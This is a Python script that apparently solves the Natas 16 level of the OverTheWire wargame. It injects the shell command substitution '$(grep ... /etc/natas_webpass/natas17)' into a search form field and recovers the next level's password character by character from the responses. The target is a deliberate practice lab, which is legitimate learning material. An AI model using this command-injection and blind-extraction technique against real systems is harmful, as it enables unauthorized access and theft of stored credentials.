import requests
import string
import re


userName = 'natas16'
url = f'http://{userName}.natas.labs.overthewire.org/'
pathDirectory = 'C:\\Users\\niroj\\Documents\\Natas\\'
password = open(pathDirectory + 'password.txt', 'r').readlines()[15][8:40]


# -------------------------- First page ----------------------------

# response = requests.get(url, auth = (userName, password))
# htmlDoc = response.text
# # print(htmlDoc)

# try:
#     with open(pathDirectory + "scripts\\temp\\index.html", 'w') as htmlContent:
#         htmlContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as index.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")

# # ---------------------------- source index file -------------------------------

# response = requests.get(url + 'index-source.html', auth = (userName, password))
# htmlDoc = response.text

# try:
#     with open(pathDirectory + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
#         htmlSourceContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as index-source.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")

# -------------------------------- file upload ------------------------------------


allString = string.ascii_uppercase + string.ascii_lowercase + string.digits
print(allString)

natasPassword = list()

while (len(natasPassword) < 32):
    for character in allString:
        cast = "".join(natasPassword) + character
        print("(*) Testing string:", cast)

        data = {
            'needle': f'anythings$(grep ^{cast} /etc/natas_webpass/natas17)',
            'submit': 'submit'
        }

        response = requests.post(url, auth = (userName, password), data = data)
        htmlDoc = response.text
        # print(htmlDoc)
        result = re.findall('<pre>\n(.*)\n</pre>', htmlDoc)
        print(result)

        if not result :
            print("(+) character is:", character)
            natasPassword.append(character)
            
            break

solution = "".join(natasPassword)
print(f"The password is:{solution}")
# try:  
#     with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlContent:
#         htmlContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as result.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")